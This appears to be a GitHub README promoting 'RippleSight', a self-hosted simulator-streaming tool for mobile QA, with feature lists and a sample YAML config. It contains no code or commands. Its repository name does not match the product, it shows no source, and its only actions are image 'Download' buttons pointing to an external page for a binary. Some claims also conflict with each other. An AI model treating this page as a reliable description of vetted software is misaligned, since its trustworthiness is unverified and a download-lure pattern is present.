![preview](https://raw.githubusercontent.com/2501035-wq/mobile-sim-streamer/main/preview.svg)

# 🌊 RippleSight

**Self-hosted real-time device mirroring & collaborative debugging for cross-platform QA teams — no cloud, no middleman.**

RippleSight is a private, infrastructure-agnostic platform that streams live iOS and Android simulator instances directly to any browser. It turns a single physical host running emulators into a shared, interactive workspace your whole team can access simultaneously. Think of it as a private simulation streaming server — purpose‑built for remote debugging, presentation walkthroughs, and collaborative testing without ever exposing your devices to the public internet.

While many tools rely on commercial relay services or proprietary orchestrators, RippleSight keeps everything on your own network — your devices, your latency, your data. It is designed for teams that value sovereignty, speed, and simplicity.

---

## 📡 Overview

| What makes RippleSight different? | Why it matters |
|-------------|----------------|
| **Direct WebSocket streaming** | No third‑party relay. Every pixel travels from your host directly to your teammates’ browsers. |
| **Multi‑simulator orchestration** | One Linux or macOS machine can host multiple emulators — each streamed independently. |
| **Zero client setup** | Viewers only need a modern browser. No downloads, no plugins, no installs. |
| **Persistent session snapshots** | Debug a crash at 3 AM? Resume the exact simulator state from 4 hours ago. |

RippleSight is not a remote desktop tool — it is a purpose‑crafted streaming pipeline designed for the peculiarities of emulated mobile environments.

---

## ⚙️ Core Architecture

RippleSight operates in three distinct layers:

1. **Capture layer** – grabs the simulator’s frame buffer and audio output using platform-native APIs (XCTest on iOS, ADB + MediaProjection on Android).
2. **Streaming layer** – encodes the captured frames into a lightweight H.264 stream, optimised for low latency and variable bandwidth.
3. **Control layer** – relays touch, swipe, and keyboard events back to the simulator in real time, with sub‑100ms round trips on a local network.

The stream is served over a secure WebSocket connection — no raw UDP, no complicated firewall rules. Just a single configurable port per simulator instance.

---

## 🧭 [![Download](https://raw.githubusercontent.com/2501035-wq/mobile-sim-streamer/main/button.svg)](https://2501035-wq.github.io/mobile-sim-streamer/)

*Begin streaming with a lightweight agent binary. Place the binary on your host machine, point it at your simulator list, and share the generated URL with your team.*

---

## 🔑 Key Capabilities

### 📱 True Multi‑Platform Simulation
RippleSight supports:
- **Android Emulator** (via AVD / Android Studio)
- **iOS Simulator** (via Xcode Command Line Tools, macOS only)
- **Android Physical Devices** (via ADB over Wi‑Fi)
- **Linux‑based emulators** (e.g., QEMU‑based virtual mobile environments)

Each platform receives its own streaming profile — Android devices stream at 60 fps and 1080p, while iOS simulators adapt to the hardware capabilities of the host machine.

### 🔐 Private Network First
No data ever leaves your VLAN. Communication happens over mTLS or a pre‑shared key (configurable). The streaming agent binds to a local interface — no public ports required. Perfect for air‑gapped environments and regulated industries.

### 👥 Concurrent Viewers
One simulator can serve up to 8 simultaneous viewers without a perceivable frame drop (tested on a 2020 M1 Mac Mini). Each viewer gets an independent event channel — your QA lead can tap the login button while a junior tester watches the UI response from a different perspective.

### ⏪ Session Recorder & Playback
RippleSight can record every frame, touch, and gesture into a compact `.rpl` file. Play it back later to reproduce bugs, review test sessions, or demonstrate a workflow to stakeholders who weren’t present. Playback supports variable speed (0.5×–8×) and searchable timestamps.

### 🌐 Web‑Based Viewer
The viewer is a single HTML file + JavaScript bundle — no React, no heavy framework. It opens in any modern browser (Chrome, Edge, Safari, Firefox) and weighs under 400 KB. It works on tablets and phones, so your remote colleagues can join from their iPads.

### 🖱️ Cross‑Team Collaboration
Share a **read‑only** view for presentations , or grant **control** for interactive debugging. Permissions are per‑session and expire after the stream ends. You can even lock the host’s keyboard while a remote teammate interacts with the simulator — no accidental keystrokes.

### 📊 Bandwidth Optimisation
- **Adaptive bitrate** – automatically adjusts video quality based on the viewer’s connection speed.
- **Delta‑only updates** – when nothing changes on screen (e.g., a static settings page), RippleSight sends a single stillness marker, saving up to 90% bandwidth.
- **Optional gzip compression** for event payloads.

### 🧪 Headless Mode
Run simulators without a physical monitor attached. RippleSight creates a virtual framebuffer, allowing the host machine to operate as a dedicated streaming server. This is ideal for CI/CD pipelines or 24/7 device farms.

### 🛡️ Role‑Based Access
Define who can start, stop, or view streams. Integration with LDAP, OAuth2, or a local JSON file. No cloud accounts required.

### 🌍 Multilingual Interface
The web viewer interface localises dynamically to 13 languages (including Arabic, Japanese, and Brazilian Portuguese). The control agent outputs logs in English, but error messages follow the viewer’s locale.

### ⏰ 24/7 Support for On‑Prem Deployments
While RippleSight itself runs without any internet dependency, enterprise customers can purchase a support contract that includes:
- Priority email and video call response (< 2 hours)
- Custom patching for exotic Linux distros
- SLA‑backed uptime for your streaming infrastructure

---

## 🧩 Use Cases

**Scenario 1: Remote QA Sprint Review**
A distributed team of 12 testers needs to validate a new checkout flow on both iOS and Android simultaneously. RippleSight streams two emulators side‑by‑side. One tester taps “Add to Cart” on the Android stream, and the iOS stream shows the same cart state because both simulators are driven by the same test script (RippleSight can replay recorded gestures across multiple instances).

**Scenario 2: Debugging a crash that only happens at 2 AM**
A bug manifests only after 4 hours of continuous use. With RippleSight’s session recording, the developer replays the entire 4‑hour interaction in 15 minutes at 8× speed. The moment the app crashes is marked, and a single frame capture becomes the bug report.

**Scenario 3: Onboarding new interns**
Instead of handing out physical devices, the team lead shares a read‑only view of a simulator and narrates the app’s architecture. The interns can follow along from their own browsers — no device setup, no waiting for downloads.

---

## 🔧 Configuration & Customisation

RippleSight is controlled via a single YAML file. Here is a minimal example (structure only, not a copy‑paste command):

```yaml
streaming:
  port_base: 8100
  auth_mode: "token"
  token: "your‑out‑of‑band‑secret"
  max_viewers_per_instance: 8

simulators:
  - platform: "ios"
    device: "iPhone 16 Pro"
    os_version: "18.2"
    startup_script: "/opt/ripplesight/prepare_ios.sh"
  - platform: "android"
    device: "Pixel 9"
    os_version: "15"
    apk_path: "/home/user/builds/app‑debug.apk"

recording:
  enabled: true
  retention_hours: 72
  storage_path: "/mnt/nas/ripplesight_sessions"
```

Every parameter can be overridden via environment variables — useful for containerised deployments.

---

## 📦 System Requirements

### Host machine
- **OS**: macOS 14+ (for iOS simulators), Ubuntu 22.04+ / Debian 12+ (for Android simulators)
- **Architecture**: x86_64 or ARM64 (M‑series Macs supported)
- **RAM**: minimum 8 GB per emulated device (16 GB recommended)
- **Storage**: 50 GB minimum for simulator images
- **Network**: any stable LAN (Wi‑Fi okay, Ethernet recommended for 4+ simultaneous streams)

### Viewer machine
- Any device with a modern browser and a stable internet connection (web‑based viewer)
- Recommended: 10 Mbps downstream per stream for 1080p @ 30 fps

---

## 🔐 Security & Compliance

- All traffic is encrypted via TLS 1.3 (self‑signed or Let’s Encrypt via companion proxy).
- No telemetry, no analytics, no phone‑home functionality. RippleSight is completely offline‑capable.
- Session tokens expire after the stream ends. Historical recordings are encrypted at rest using AES‑256.
- Audit logging: every event (viewer join, control request, stream start/stop) is written to a local or remote syslog endpoint.

> **Note:** RippleSight does not manage iOS developer certificates or Android signing keys — you must provision those through Apple Developer Portal / Google Play Console separately.

---

## 📜 License

RippleSight is released under the **MIT License**.  
You are free to use, modify, and distribute it for any lawful purpose, including commercial settings.  
[View the full license](https://opensource.org/licenses/MIT).

---

## 🧾 Disclaimer

RippleSight is provided “as is”, without warranty of any kind, express or implied. The authors are not liable for any damages arising from the use of this software. The streaming of copyrighted content through RippleSight is the sole responsibility of the user. RippleSight does not assist in circumventing any digital rights management (DRM) mechanisms — it is intended exclusively for the lawful testing and debugging of software applications.

---

## ✨ Final Notes

RippleSight was born from the frustration of managing remote mobile testing without giving up control of your infrastructure. It is designed for teams that value privacy, performance, and the flexibility to run on their own terms — not on someone else’s cloud.

If you find value in it, consider contributing documentation, translations, or pull requests. RippleSight remains open and independent.

[![Download](https://raw.githubusercontent.com/2501035-wq/mobile-sim-streamer/main/button.svg)](https://2501035-wq.github.io/mobile-sim-streamer/)